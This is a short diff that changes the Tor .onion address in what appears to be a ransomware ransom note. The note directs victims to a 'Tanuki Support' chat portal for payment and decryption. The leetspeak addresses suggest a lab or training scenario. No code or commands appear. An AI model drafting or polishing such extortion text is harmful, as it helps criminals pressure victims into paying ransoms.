@@ -18,7 +18,7 @@ Visit https://www.torproject.org to install the Tor Browser.
 
 2. Contact Tanuki Support
 In the Tor Browser, go to our secure chat portal:
-http://1337.tanukisupport.onion
+http://1337t4nuki1337supp0rt1234.onion
 
 3. Follow Payment Instructions
 Our support team will guide you through the process of payment and decryption.
